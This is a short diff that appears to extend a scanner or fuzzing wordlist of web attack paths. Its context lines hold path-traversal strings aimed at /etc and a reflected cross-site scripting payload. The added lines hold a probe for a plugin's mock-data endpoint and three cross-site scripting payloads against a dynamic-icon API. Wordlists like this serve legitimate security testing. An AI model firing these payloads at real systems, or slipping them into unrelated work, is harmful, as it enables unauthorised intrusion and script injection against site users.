@@ -2100,3 +2100,8 @@
 /application/..%252F..%252F..%252F..%252F..%252Fetc
 /application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
 /o/blogs-web/blogs/entry_cover_image_caption.jsp?coverImageURL=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+{{pagepath}}
+/wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings
+/api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E<script>alert(document.domain)</script><text%3E
+/api/icon/getDynamicIcon?type=8&content=%3C%2Ftext%3E%3Cimage%20href%3Dx%20onerror%3Dalert(document.domain)%3E%3C%2Fimage%3E%3Ctext%3E
+/api/icon/getDynamicIcon?type=8&color=red&content=%3C%2Ftext%3E%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E%3Ctext%3E
